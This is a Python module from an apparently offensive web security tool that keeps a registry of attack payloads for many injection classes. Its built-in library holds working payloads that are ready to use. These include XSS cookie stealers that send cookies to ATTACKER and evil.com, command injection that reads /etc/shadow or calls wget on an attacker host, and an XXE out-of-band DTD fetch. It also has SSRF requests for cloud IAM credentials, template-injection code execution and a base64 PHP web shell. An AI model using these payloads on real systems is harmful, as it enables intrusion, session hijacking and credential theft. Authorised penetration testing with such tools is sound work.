"""
Payload Manager – Athena Security Suite
========================================
Provides a centralised, profile-aware payload registry that merges
built-in payloads from ``config/payloads.json`` with user-supplied custom
payloads at runtime.

Usage example::

    from modules.payload_manager import PayloadManager

    pm = PayloadManager()
    payloads = pm.get_payloads('SQL_INJECTION', profile='aggressive')

    # Register a one-off payload at runtime
    pm.register_payload(
        'XSS',
        '<svg/onload=fetch(`//evil.com/?c=${document.cookie}`)>',
        metadata={'author': 'red-team', 'cve': 'N/A'},
    )

    # Load a custom payload file supplied by the operator
    pm.load_custom_payloads('/path/to/custom_payloads.json')

    # Dump merged payload set for audit trail
    export = pm.export_effective_payloads()
"""

import json
import logging
import os
from copy import deepcopy
from typing import Any, Dict, List, Optional

from modules.framework_config import PAYLOAD_TEMPLATES, WAF_BYPASS_TECHNIQUES

logger = logging.getLogger('athena.payload_manager')


# ---------------------------------------------------------------------------
# Built-in payload library (extends config/payloads.json)
# ---------------------------------------------------------------------------

_BUILTIN_PAYLOADS: Dict[str, Dict[str, Any]] = {
    # -------------------------------------------------------------------
    # SQL Injection
    # -------------------------------------------------------------------
    'SQL_INJECTION': {
        'default': [
            "' OR '1'='1",
            "admin' --",
            "' OR 1=1 --",
            "1' UNION SELECT NULL --",
            "1 AND 1=1",
            "1 AND 1=2",
        ],
        'error_based': [
            "' AND extractvalue(rand(), concat(0x3a, version())) -- -",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT version()),0x7e,0x41))s), 8446744073709551610, 8446744073709551610))) -- -",
            "1' ORDER BY 1 --",
            "1' ORDER BY 1000 --",
        ],
        'union': [
            "' UNION SELECT 1,2,3 -- -",
            "' UNION SELECT NULL,NULL,NULL -- -",
            "1' UNION SELECT version(),user(),database() -- -",
        ],
        'time_based': [
            "' AND SLEEP(5) -- -",
            "'; WAITFOR DELAY '0:0:5' --",
            "' AND pg_sleep(5) --",
            "1; SELECT SLEEP(5) --",
        ],
        'boolean': [
            "' AND '1'='1",
            "' AND '1'='2",
            "1 AND 1=1 --",
            "1 AND 1=2 --",
        ],
        'aggressive': [
            "1' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata -- -",
            "1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -",
            "1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' -- -",
        ],
    },

    # -------------------------------------------------------------------
    # Cross-Site Scripting (XSS)
    # -------------------------------------------------------------------
    'XSS': {
        'default': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ],
        'dom': [
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
            "<svg/onload=alert(1)>",
            "javascript:alert(document.domain)",
        ],
        'filter_bypass': [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<img src=x OnErRoR=alert(1)>",
            "<svg onload\x09=alert(1)>",
            "<%00script>alert(1)</%00script>",
        ],
        'polyglot': [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )///</STYJLE////",
            "'\"()&%<acb><ScRiPt>alert('XSS')</ScRiPt>",
        ],
        'cookie_stealer': [
            "<script>fetch('//ATTACKER/?c='+document.cookie)</script>",
            "<img src=x onerror=\"fetch('//ATTACKER/?c='+btoa(document.cookie))\">",
        ],
        'aggressive': [
            "<script>document.location='//ATTACKER/?c='+document.cookie</script>",
            "<svg/onload=fetch(`//ATTACKER/?c=${document.cookie}`)>",
        ],
    },

    # -------------------------------------------------------------------
    # Command Injection
    # -------------------------------------------------------------------
    'COMMAND_INJECTION': {
        'default': [
            '; id ;',
            '| whoami',
            '&& whoami',
            '; sleep 5 ;',
        ],
        'unix': [
            '; cat /etc/passwd',
            '`id`',
            '$(id)',
            '; uname -a ;',
            '; ifconfig ;',
        ],
        'windows': [
            '& whoami',
            '| whoami /all',
            '& ipconfig /all',
            '& dir C:\\',
            '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
        ],
        'blind': [
            '; sleep 5 ;',
            '| ping -c 5 127.0.0.1',
            '`sleep 5`',
            '$(sleep 5)',
            '; wget http://ATTACKER/ ;',
        ],
        'filter_bypass': [
            ';${IFS}id',
            '|${IFS}id',
            ';{id}',
            'a;id',
            "'id'",
        ],
        'aggressive': [
            '; id; cat /etc/passwd; whoami; uname -a ;',
            '|| id || cat /etc/shadow ||',
        ],
    },

    # -------------------------------------------------------------------
    # Local File Inclusion (LFI) / Path Traversal
    # -------------------------------------------------------------------
    'FILE_INCLUSION': {
        'default': [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            'php://filter/convert.base64-encode/resource=config.php',
        ],
        'linux': [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '../../../../etc/passwd',
            '../../../../etc/shadow',
        ],
        'windows': [
            '../../../../windows/win.ini',
            '../../../../windows/system32/drivers/etc/hosts',
            '..\\..\\..\\..\\boot.ini',
        ],
        'null_byte': [
            '../../../../etc/passwd%00',
            '../../../../etc/passwd\x00',
        ],
        'encoding': [
            '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
        ],
        'aggressive': [
            'php://filter/read=convert.base64-encode/resource=../config/database.php',
            'expect://id',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        ],
    },

    # -------------------------------------------------------------------
    # Server-Side Request Forgery (SSRF)
    # -------------------------------------------------------------------
    'SSRF': {
        'default': [
            'http://127.0.0.1',
            'http://localhost',
            'http://[::1]',
        ],
        'cloud_metadata': [
            # AWS IMDSv1
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            # Google Cloud
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
            # Azure IMDS
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            # DigitalOcean
            'http://169.254.169.254/metadata/v1/',
        ],
        'internal_network': [
            'http://192.168.0.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
        ],
        'file_read': [
            'file:///etc/passwd',
            'file:///C:/Windows/win.ini',
        ],
        'aggressive': [
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-service-role',
            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env',
        ],
    },

    # -------------------------------------------------------------------
    # XML External Entity (XXE)
    # -------------------------------------------------------------------
    'XXE': {
        'default': [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
        ],
        'blind_oob': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><foo>&send;</foo>',
        ],
        'linux': [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY ent SYSTEM "file:///etc/shadow">]><root>&ent;</root>',
        ],
        'aggressive': [
            '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
    },

    # -------------------------------------------------------------------
    # Header Injection / CRLF
    # -------------------------------------------------------------------
    'HEADER_INJECTION': {
        'default': [
            '%0d%0aSet-Cookie: injected=true',
            "\r\nSet-Cookie: injected=true",
            '%0aContent-Length: 0',
        ],
        'redirect': [
            '%0d%0aLocation: http://evil.com',
            "\r\nLocation: http://evil.com",
        ],
    },

    # -------------------------------------------------------------------
    # Authentication Bypass
    # -------------------------------------------------------------------
    'AUTH_BYPASS': {
        'default': [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("administrator", "admin"),
        ],
        'sqli': [
            ("' OR 1=1 --", "anything"),
            ("admin'--", "anything"),
            ("' OR 'x'='x", "' OR 'x'='x"),
        ],
    },

    # -------------------------------------------------------------------
    # Server-Side Template Injection (SSTI)
    # -------------------------------------------------------------------
    'SSTI': {
        'default': [
            '{{7*7}}',
            '${7*7}',
            '${{7*7}}',
            '#{7*7}',
            '{{7*\'7\'}}',
        ],
        'jinja2': [
            '{{7*7}}',
            '{{7*\'7\'}}',
            '{{config}}',
            '{{request}}',
            '{{self.__class__.__mro__}}',
        ],
        'freemarker': [
            '${7*7}',
            '${"7"*7}',
            '${7*\'7\'}',
        ],
        'velocity': [
            '${{7*7}}',
            '#set($x=7*7)$x',
            '$foo.getClass()',
        ],
        'smarty': [
            '{$smarty.version}',
            '{7*7}',
        ],
        'aggressive': [
            '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
            '${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}',
        ],
    },

    # -------------------------------------------------------------------
    # NoSQL Injection
    # -------------------------------------------------------------------
    'NOSQL_INJECTION': {
        'default': [
            '{"$gt": ""}',
            '{"$ne": ""}',
            '{"$regex": ".*"}',
        ],
        'mongodb': [
            '{"$gt": ""}',
            '{"$ne": ""}',
            '{"$where": "sleep(5000)"}',
            'admin\' || \'1\'==\'1',
            'admin\' && this.password && \'1\'==\'1',
        ],
        'aggressive': [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            'username[$ne]=admin&password[$ne]=admin',
        ],
    },

    # -------------------------------------------------------------------
    # LDAP Injection
    # -------------------------------------------------------------------
    'LDAP_INJECTION': {
        'default': [
            '*',
            '*)(uid=*',
            '*|(uid=*)',
            'admin*',
        ],
        'aggressive': [
            '*)(uid=*))(|(uid=*',
            '*)((|(uid=*)',
            '*)(uid=*)(|(uid=*)',
        ],
    },

    # -------------------------------------------------------------------
    # XPath Injection
    # -------------------------------------------------------------------
    'XPATH_INJECTION': {
        'default': [
            "' OR '1'='1",
            "' OR '1'='1' AND '1'='1",
            "admin' AND '1'='1",
        ],
        'aggressive': [
            "' OR 1=1 OR ''='",
            "' OR '1'='1' OR 'x'='y",
        ],
    },

    # -------------------------------------------------------------------
    # Open Redirect
    # -------------------------------------------------------------------
    'OPEN_REDIRECT': {
        'default': [
            '//evil.com',
            '///evil.com',
            '/\\evil.com',
            'http://evil.com',
        ],
        'encoded': [
            'http%3A%2F%2Fevil.com',
            '%2F%2Fevil.com',
            '%0ahttp://evil.com',
        ],
        'protocol_bypass': [
            'javascript:alert(1)//',
            'data:text/html,<script>alert(1)</script>',
        ],
    },
    # -------------------------------------------------------------------
    # Prototype Pollution
    # -------------------------------------------------------------------
    'PROTOTYPE_POLLUTION': {
        'default': [
            '__proto__[polluted]=true',
            'constructor[prototype][polluted]=true',
            '__proto__.polluted=true',
        ],
        'aggressive': [
            '{"__proto__":{"polluted":"true"}}',
            '{"constructor":{"prototype":{"polluted":"true"}}}',
        ],
    },

    # -------------------------------------------------------------------
    # HTTP Parameter Pollution
    # -------------------------------------------------------------------
    'HTTP_PARAMETER_POLLUTION': {
        'default': [
            '&param=evil',
            '&&param=evil',
            '|param=evil',
        ],
    },
}


# ---------------------------------------------------------------------------
# PayloadManager class
# ---------------------------------------------------------------------------


class PayloadManager:
    """Centralised payload registry with profile support and custom payload loading.

    The manager merges three payload sources, in order of precedence:
    1. Built-in payloads (``_BUILTIN_PAYLOADS`` above).
    2. Payloads from ``config/payloads.json`` (``PAYLOAD_TEMPLATES``).
    3. User-supplied custom payloads (loaded via :meth:`load_custom_payloads`).

    This precedence means custom payloads always win over built-ins, giving
    operators full control without modifying library code.
    """

    def __init__(self) -> None:
        # Deep-copy built-in library so mutations do not bleed between instances
        self._registry: Dict[str, Dict[str, List[Any]]] = deepcopy(_BUILTIN_PAYLOADS)

        # Merge PAYLOAD_TEMPLATES from config/payloads.json
        for vuln_type, templates in PAYLOAD_TEMPLATES.items():
            key = vuln_type.upper()
            if key not in self._registry:
                self._registry[key] = {}
            # Templates may be dicts or lists – normalise to lists
            if isinstance(templates, dict):
                for profile, payloads in templates.items():
                    plist = [payloads] if isinstance(payloads, str) else list(payloads)
                    self._registry[key].setdefault(profile, [])
                    self._registry[key][profile].extend(plist)
            elif isinstance(templates, list):
                self._registry[key].setdefault('default', [])
                self._registry[key]['default'].extend(templates)

        # Custom payloads are stored separately so we can export them clearly
        self._custom: Dict[str, Dict[str, List[Any]]] = {}
        self._custom_metadata: Dict[str, List[Dict[str, Any]]] = {}

        logger.debug(
            'PayloadManager initialised with %d vulnerability categories',
            len(self._registry),
        )

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def get_payloads(
        self,
        vuln_type: str,
        profile: str = 'default',
        include_aggressive: bool = False,
    ) -> List[Any]:
        """Return payloads for *vuln_type* under the given *profile*.

        Args:
            vuln_type:          Vulnerability category, e.g. ``'SQL_INJECTION'``.
            profile:            Payload sub-category, e.g. ``'time_based'``.
                                Falls back to ``'default'`` if *profile* not found.
            include_aggressive: When ``True``, ``aggressive`` profile payloads are
                                appended to the returned list.

        Returns:
            A deduplicated list of payload strings / tuples from the registry.
        """
        key = vuln_type.upper()
        builtin = self._registry.get(key, {})
        custom = self._custom.get(key, {})

        # Merge custom into builtin view for this call
        merged: Dict[str, List[Any]] = {}
        for p, v in {**builtin, **custom}.items():
            merged.setdefault(p, [])
            merged[p].extend(v)

        result: List[Any] = list(merged.get(profile, merged.get('default', [])))

        if include_aggressive and profile != 'aggressive':
            result.extend(merged.get('aggressive', []))

        # Deduplicate while preserving order
        seen: set = set()
        deduped: List[Any] = []
        for p in result:
            key_repr = repr(p)
            if key_repr not in seen:
                seen.add(key_repr)
                deduped.append(p)

        logger.debug(
            'get_payloads(%s, %s, aggressive=%s) → %d payloads',
            vuln_type, profile, include_aggressive, len(deduped),
        )
        return deduped

    def get_all_profiles(self, vuln_type: str) -> List[str]:
        """Return the list of available profile names for *vuln_type*."""
        key = vuln_type.upper()
        profiles = set(self._registry.get(key, {}).keys())
        profiles.update(self._custom.get(key, {}).keys())
        return sorted(profiles)

    def list_categories(self) -> List[str]:
        """Return all registered vulnerability category names."""
        return sorted(set(self._registry.keys()) | set(self._custom.keys()))

    def register_payload(
        self,
        vuln_type: str,
        payload: Any,
        profile: str = 'custom',
        metadata: Optional[Dict[str, Any]] = None,
    ) -> None:
        """Register a single payload into the custom layer at runtime.

        Args:
            vuln_type: Vulnerability category.
            payload:   The payload value (string, tuple, etc.).
            profile:   Profile / sub-category to place it under.
            metadata:  Optional dict of audit metadata (author, CVE, date, etc.).
        """
        key = vuln_type.upper()
        self._custom.setdefault(key, {}).setdefault(profile, [])
        self._custom[key][profile].append(payload)

        # Record metadata for the export/audit trail
        self._custom_metadata.setdefault(key, []).append({
            'payload': repr(payload),
            'profile': profile,
            'metadata': metadata or {},
        })

        logger.info(
            'Registered custom payload for %s/%s (total custom: %d)',
            key, profile, len(self._custom.get(key, {}).get(profile, [])),
        )

    def load_custom_payloads(self, path: str) -> int:
        """Load custom payloads from a JSON file and merge them into the custom layer.

        Expected JSON format::

            {
                "SQL_INJECTION": {
                    "time_based": ["...", "..."],
                    "custom": ["..."]
                },
                "XSS": {
                    "default": ["..."]
                }
            }

        Flat lists are also accepted::

            {
                "SQL_INJECTION": ["...", "..."]
            }

        Args:
            path: Absolute or relative path to the custom payload JSON file.

        Returns:
            Total number of payloads loaded from the file.

        Raises:
            FileNotFoundError: If *path* does not exist.
            ValueError:        If the file contains invalid JSON.
        """
        if not os.path.exists(path):
            raise FileNotFoundError(f'Custom payload file not found: {path}')

        with open(path, 'r', encoding='utf-8') as fh:
            try:
                data: Dict[str, Any] = json.load(fh)
            except json.JSONDecodeError as exc:
                raise ValueError(f'Invalid JSON in {path}: {exc}') from exc

        total_loaded = 0
        for vuln_type, payload_data in data.items():
            key = vuln_type.upper()
            self._custom.setdefault(key, {})

            if isinstance(payload_data, list):
                self._custom[key].setdefault('default', [])
                self._custom[key]['default'].extend(payload_data)
                total_loaded += len(payload_data)
            elif isinstance(payload_data, dict):
                for profile, payloads in payload_data.items():
                    plist = [payloads] if isinstance(payloads, str) else list(payloads)
                    self._custom[key].setdefault(profile, [])
                    self._custom[key][profile].extend(plist)
                    total_loaded += len(plist)
            else:
                logger.warning('Skipping unrecognised payload format for %s in %s', key, path)

        logger.info('Loaded %d custom payloads from %s', total_loaded, path)
        return total_loaded

    def export_effective_payloads(self) -> Dict[str, Any]:
        """Return the complete merged payload registry for audit purposes.

        The export separates built-in payloads from custom ones so that
        security auditors can distinguish the operator's additions.

        Returns:
            A fully serialisable dictionary with ``built_in``, ``custom``,
            ``custom_metadata``, and ``categories`` keys.
        """
        return {
            'categories': self.list_categories(),
            'built_in': deepcopy(self._registry),
            'custom': deepcopy(self._custom),
            'custom_metadata': deepcopy(self._custom_metadata),
            'waf_bypass_techniques': WAF_BYPASS_TECHNIQUES,
        }

    def get_waf_bypass(self, vuln_type: str) -> List[str]:
        """Return WAF bypass variants for the given vulnerability type.

        Falls back to an empty list when no bypass techniques are defined
        for the requested category.
        """
        key = vuln_type.upper()
        techniques = WAF_BYPASS_TECHNIQUES.get(key, {})
        payloads: List[str] = []
        if isinstance(techniques, dict):
            for variants in techniques.values():
                if isinstance(variants, list):
                    payloads.extend(variants)
        elif isinstance(techniques, list):
            payloads.extend(techniques)
        return payloads


# ---------------------------------------------------------------------------
# Module-level singleton
# ---------------------------------------------------------------------------

#: Global PayloadManager instance – import and use this directly in modules.
payload_manager = PayloadManager()
